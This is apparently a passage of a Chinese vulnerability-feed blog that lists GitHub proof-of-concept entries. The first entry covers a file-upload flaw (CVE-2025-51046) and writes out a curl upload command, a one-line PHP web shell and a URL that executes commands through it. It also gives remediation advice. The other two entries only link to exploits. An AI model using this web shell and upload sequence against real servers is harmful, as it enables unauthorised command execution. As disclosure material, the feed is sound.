    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> SourceCodester Online Student Clearance System 1.0 文件上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-51046</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> SourceCodester Online Student Clearance System v1.0 在 <code>edit-photo.php</code> 文件中存在一个不受限制的文件上传漏洞。应用程序未能验证或限制上传的文件类型，允许攻击者上传PHP脚本（例如，一个web shell）。该脚本存储在公开可访问的 <code>/uploads/</code> 目录中，使得远程攻击者能够在服务器上执行任意系统命令。</p><p><strong>产品厂商：</strong> SourceCodeste</p><p><strong>产品名称：</strong> Online Student Clearance System using PHP and MySQL</p><p><strong>影响版本：</strong> 1.0</p><p><strong>来源：</strong> <a href="https://github.com/0xMesh-X/CVE-2025-51046">https://github.com/0xMesh-X/CVE-2025-51046</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-51046-Remote-File-Upload-Vulnerability-in-SourceCodeste-Online-Student-Clearance-System-v1-0"><a href="#CVE-2025-51046-Remote-File-Upload-Vulnerability-in-SourceCodeste-Online-Student-Clearance-System-v1-0" class="headerlink" title="CVE-2025-51046 - Remote File Upload Vulnerability in SourceCodeste Online Student Clearance System v1.0"></a>CVE-2025-51046 - Remote File Upload Vulnerability in SourceCodeste Online Student Clearance System v1.0</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><strong>CVE ID</strong>: CVE-2025-51046<br><strong>Vendor</strong>: SourceCodeste<br><strong>Product</strong>: Online Student Clearance System using PHP and MySQL<br><strong>Version</strong>: 1.0<br><strong>Component</strong>: <code>edit-photo.php</code> file upload functionality (and the <code>/uploads/</code> directory)<br><strong>Attack Type</strong>: Remote<br><strong>Vulnerability Type</strong>: Remote File Upload (leading to Remote Code Execution)<br><strong>Discoverer</strong>: Meshari Alluhaybi</p><hr><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>SourceCodeste Online Student Clearance System v1.0 has an unrestricted file upload vulnerability in the <code>edit-photo.php</code> file. The application fails to validate or restrict uploaded file types, allowing an attacker to upload a PHP script (e.g., a web shell). The script is stored in the publicly accessible <code>/uploads/</code> directory, enabling remote attackers to execute arbitrary system commands on the server.</p><hr><h3 id="Attack-Vectors"><a href="#Attack-Vectors" class="headerlink" title="Attack Vectors"></a>Attack Vectors</h3><p>An attacker can exploit this vulnerability by uploading a malicious PHP file via the file upload functionality in <code>edit-photo.php</code>. Due to lack of proper file type restrictions and sanitization, the malicious file is stored in <code>/uploads/</code> where it can be directly accessed and executed.</p><hr><h3 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h3><h4 id="1-Upload-the-Web-Shell"><a href="#1-Upload-the-Web-Shell" class="headerlink" title="1. Upload the Web Shell"></a>1. Upload the Web Shell</h4><p>curl -F “userImage&#x3D;@shell.php;type&#x3D;application&#x2F;x-php” -F “btnedit&#x3D;” <a href="http://192.168.8.138/edit-photo.php">http://192.168.8.138/edit-photo.php</a></p><p><strong>Contents of <code>shell.php</code>:</strong></p><?php system($_GET['cmd']); ?><h4 id="2-Execute-Remote-Commands"><a href="#2-Execute-Remote-Commands" class="headerlink" title="2. Execute Remote Commands"></a>2. Execute Remote Commands</h4><p>Access the uploaded shell:</p><p><a href="http://192.168.8.138/uploads/shell.php?cmd=id">http://192.168.8.138/uploads/shell.php?cmd=id</a></p><p>This command will execute the <code>id</code> command on the server, proving remote code execution.</p><hr><h3 id="Affected-Product-Details"><a href="#Affected-Product-Details" class="headerlink" title="Affected Product Details"></a>Affected Product Details</h3><ul><li><strong>Vendor</strong>: SourceCodeste</li><li><strong>Product</strong>: Online Student Clearance System using PHP and MySQL</li><li><strong>Version</strong>: 1.0</li><li><strong>Component</strong>: <code>edit-photo.php</code> (file upload functionality) and <code>/uploads/</code> directory</li></ul><hr><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><ul><li>Full remote code execution on the server</li><li>Potential system compromise and privilege escalation</li><li>Unauthorized manipulation of the web application</li></ul><hr><h3 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h3><ul><li><strong>File Upload Restrictions</strong>: Enforce strict file extension whitelisting (e.g., allow only <code>.jpg</code>, <code>.png</code>).</li><li><strong>MIME Type Verification</strong>: Check MIME types on the server side to ensure files match allowed types.</li><li><strong>Storage Location</strong>: Store uploaded files outside the web root to prevent direct access.</li><li><strong>File Renaming</strong>: Rename uploaded files and remove original extensions to reduce risk.</li></ul><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="http://sourcecodester.com/">SourceCodester</a></li><li><a href="http://online.com/">Online Student Clearance System</a></li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; SourceCodester Online Student Clearance</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-44608</title>
    <link href="http://example.com/2025/06/25/github_3196306318/"/>
    <id>http://example.com/2025/06/25/github_3196306318/</id>
    <published>2025-06-25T17:45:37.607Z</published>
    <updated>2025-06-25T17:45:37.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-44608</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-44608</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> CVE-2025-44608漏洞详情未提供具体信息。</p><p><strong>来源：</strong> <a href="https://github.com/mr-xmen786/CVE-2025-44608">https://github.com/mr-xmen786/CVE-2025-44608</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-44608"><a href="#CVE-2025-44608" class="headerlink" title="CVE-2025-44608"></a>CVE-2025-44608</h2><p>CVE-2025-44608</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-44608&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/st</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入漏洞</title>
    <link href="http://example.com/2025/06/25/github_2860129429/"/>
    <id>http://example.com/2025/06/25/github_2860129429/</id>
    <published>2025-06-25T17:45:28.612Z</published>
    <updated>2025-06-25T17:45:28.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中，发现了一个问题。如果启用了admin_allow_langedit，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20348">https://github.com/rapid7/metasploit-framework/issues/20348</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>ISPConfig language_edit.php PHP Code Injection<br>An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>POC as msf module</p><p><a href="https://github.com/SyFi/CVE-2023-46818">https://github.com/SyFi/CVE-2023-46818</a><br><a href="https://karmainsecurity.com/KIS-2023-13">https://karmainsecurity.com/KIS-2023-13</a></p><p><img src="https://github.com/user-attachments/assets/66cdfa74-fd64-46a5-a3ac-e0d698f24ec5" alt="Image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入漏洞&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
